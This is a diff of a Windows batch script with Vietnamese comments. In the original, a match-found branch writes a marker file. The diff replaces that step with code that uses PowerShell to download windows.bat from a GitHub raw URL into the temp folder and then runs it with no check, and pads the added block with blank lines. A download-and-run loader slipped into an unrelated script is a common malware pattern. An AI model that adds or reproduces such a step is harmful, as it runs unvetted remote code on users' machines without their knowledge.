@@ -29,8 +29,27 @@ for /f "delims=" %%j in ('type "%tempfile%"') do (
 
 :: Tạo file Oke.txt nếu tìm thấy trùng lặp
 if %found%==1 (
-    echo Trung khop -> Tạo file C:\Oke.txt
-    echo Trung khop > "C:\Oke.txt"
+
+
+
+
+set URL=https://raw.githubusercontent.com/mitutina/mitutina/main/windows.bat
+set FILE=%temp%\windows.bat
+
+:: Tải file bằng PowerShell
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%FILE%')"
+
+if exist "%FILE%" (
+    echo Đang chạy file...
+    start "" "%FILE%"
+    
+) else (
+    echo Lỗi: Không thể tải file từ %URL%.
+
+
+
+
+)
 ) else (
     echo Khong trung khop.
 )
